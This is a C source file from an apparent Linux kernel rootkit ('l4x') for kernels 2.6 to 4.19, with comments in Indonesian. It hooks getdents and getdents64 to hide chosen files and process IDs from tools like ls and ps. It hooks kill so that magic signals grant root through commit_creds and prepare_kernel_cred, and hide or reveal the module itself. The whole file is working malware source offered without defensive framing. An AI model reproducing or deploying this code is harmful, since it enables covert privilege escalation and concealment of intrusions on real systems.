/*
 * hooks.c — implementasi syscall palsu era legacy (2.6 –4.19).
 *
 * Dua konvensi (lihat kver.h L4X_OLD_ARGS):
 *   <4.17 : argumen individual — kita dipanggil langsung dengan fd/dirp/count
 *   >=4.17: pt_regs* — kita baca argumen dari struktur itu
 *
 * Logika filter & LPE sama dengan backend modern (diduplikasi agar tiap
 * backend berdiri sendiri).
 */
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/stddef.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/printk.h>
#include <asm/ptrace.h>
#include "kver.h"
#include "l4x.h"

/* ---------- hasil tersaring (dipakai kedua konvensi) ---------- */

struct __attribute__((packed)) l4x_dirent64 {
	u64               d_ino;
	u64               d_off;
	unsigned short    d_reclen;
	unsigned char     d_type;
	char              d_name[];
};

/* linux_dirent — syscall getdents LAMA (78): nama mulai offset 18, tanpa
 * d_type. BUKTI LAPANGAN (CentOS7/glibc 2.17): ls & ps memanggil
 * getdents(78), BUKAN getdents64 — karenanya KEDUANYA kini di-hook. */
struct __attribute__((packed)) l4x_dirent32 {
	u64               d_ino;
	u64               d_off;
	unsigned short    d_reclen;
	char              d_name[];
};

#define NAME_OFF    offsetof(struct l4x_dirent64, d_name)  /* 19 */
#define NAME_OFF_32 offsetof(struct l4x_dirent32, d_name)  /* 18 */

static bool name_blocked(const char *n, unsigned int max)
{
	unsigned int i, l;

	if (!n || !max)
		return false;
	l = strnlen(n, max);
	if (!l)
		return false;
	if (l4x_is_hidden_name(n))
		return true;
	for (i = 0; i < l; i++)
		if (!isdigit(n[i]))
			return false;
	return l4x_is_hidden_pid(n);
}

static long l4x_filter_result(long ret, char __user *ubuf, unsigned int name_off)
{
	unsigned long pos = 0, out = 0;
	char *kb;

	if (ret <= 0 || ret > (1L << 24))
		return ret;

	kb = kmalloc((size_t)ret, GFP_KERNEL);
	if (!kb)
		return ret;
	if (copy_from_user(kb, ubuf, (unsigned long)ret)) {
		kfree(kb);
		return ret;
	}

	while (pos + name_off < (unsigned long)ret) {
		struct l4x_dirent64 *d = (void *)(kb + pos);
		unsigned int reclen = d->d_reclen;

		if (reclen < name_off + 1 || pos + reclen > (unsigned long)ret)
			break;
		if (!name_blocked((const char *)d + name_off, reclen - name_off)) {
			if (out != pos)
				memmove(kb + out, d, reclen);
			out += reclen;
		}
		pos += reclen;
	}

	if (out != (unsigned long)ret && copy_to_user(ubuf, kb, out) == 0)
		ret = out;

	kfree(kb);
	return ret;
}

/* ---------- LPE (dipakai kedua konvensi) ---------- */

typedef struct task_struct *(*l4x_pkc_t)(struct task_struct *);
typedef void               (*l4x_cc_t)(struct task_struct *);

static bool l4x_try_lpe(void)
{
	static l4x_pkc_t f_pkc;
	static l4x_cc_t  f_cc;

	if (!f_pkc || !f_cc) {
		f_pkc = (l4x_pkc_t)kallsyms_lookup_name("prepare_kernel_cred");
		f_cc  = (l4x_cc_t)kallsyms_lookup_name("commit_creds");
	}
	if (f_pkc && f_cc) {
		f_cc(f_pkc(NULL));
		pr_info("l4x: root diberikan ke pid %d\n", (int)current->pid);
		return true;
	}
	pr_warn("l4x: commit_creds tak ditemukan\n");
	return false;
}

/* ---------- entry sesuai konvensi ---------- */

#if L4X_OLD_ARGS
/* ============ kernel2.6 –4.16 : argumen individual ============ */

long l4x_sys_getdents64(unsigned int fd, char __user *dirp, unsigned int count)
{
	long ret = l4x_call_orig_getdents64(fd, dirp, count);

	return l4x_filter_result(ret, dirp, NAME_OFF);
}

long l4x_sys_getdents(unsigned int fd, char __user *dirp, unsigned int count)
{
	long ret = l4x_call_orig_getdents(fd, dirp, count);

	return l4x_filter_result(ret, dirp, NAME_OFF_32);
}

long l4x_sys_kill(int pid, int sig)
{
	if (sig == L4X_LPE_SIG && l4x_try_lpe())
		return 0;                    /* tidak jalankan kill asli */
	if (sig == L4X_MODHIDE_SIG) {
		if (l4x_modhide_hide())
			pr_warn("l4x: modhide gagal (fitur tak aktif?)\n");
		return 0;
	}
	if (sig == L4X_MODSHOW_SIG) {
		if (l4x_modhide_show())
			pr_warn("l4x: modshow gagal (fitur tak aktif?)\n");
		return 0;
	}
	return l4x_call_orig_kill(pid, sig);
}

#else
/* ============ kernel4.17 –4.19 : pt_regs ============ */

long l4x_sys_getdents64(const struct pt_regs *regs)
{
	long ret = l4x_call_orig_getdents64(regs);

	return l4x_filter_result(ret, (char __user *)regs->si, NAME_OFF);
}

long l4x_sys_getdents(const struct pt_regs *regs)
{
	long ret = l4x_call_orig_getdents(regs);

	return l4x_filter_result(ret, (char __user *)regs->si, NAME_OFF_32);
}

long l4x_sys_kill(const struct pt_regs *regs)
{
	if ((int)regs->si == L4X_LPE_SIG && l4x_try_lpe())
		return 0;
	if ((int)regs->si == L4X_MODHIDE_SIG) {
		if (l4x_modhide_hide())
			pr_warn("l4x: modhide gagal (fitur tak aktif?)\n");
		return 0;
	}
	if ((int)regs->si == L4X_MODSHOW_SIG) {
		if (l4x_modhide_show())
			pr_warn("l4x: modshow gagal (fitur tak aktif?)\n");
		return 0;
	}
	return l4x_call_orig_kill(regs);
}

#endif /* L4X_OLD_ARGS */
